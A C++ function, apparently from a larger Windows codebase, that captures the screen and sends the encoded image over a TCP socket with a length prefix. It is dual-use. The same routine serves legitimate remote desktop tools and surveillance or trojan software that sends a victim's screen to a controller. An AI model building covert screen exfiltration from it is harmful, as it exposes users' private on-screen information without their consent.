bool Screenshoot::_screenToSocket(SOCKET s, LPWSTR mimeType, DWORD quality, WORD rect)
{
  bool retVal = false;
  IStream *stream = Screenshoot::_screenToIStream(mimeType, quality, rect);
  if(stream != NULL)
  {
    STATSTG ss;
    if(stream->Stat(&ss, STATFLAG_NONAME) == S_OK && ss.cbSize.HighPart == 0)
    {
      LPBYTE buf = (LPBYTE)Mem::alloc(sizeof(DWORD) + ss.cbSize.LowPart);
      if(buf != NULL)
      {
        if(stream->Read(buf + sizeof(DWORD), ss.cbSize.LowPart, &ss.cbSize.LowPart) == S_OK)
        {
          *((LPDWORD)buf) = ss.cbSize.LowPart;
          retVal = WSocket::tcpSend(s, buf, sizeof(DWORD) + ss.cbSize.LowPart);
        }
        Mem::free(buf);
      }
    }
    stream->Release();
  }

  if(retVal == false)
  {
    DWORD size = 0;
    WSocket::tcpSend(s, &size, sizeof(DWORD));
  }

  return retVal;
}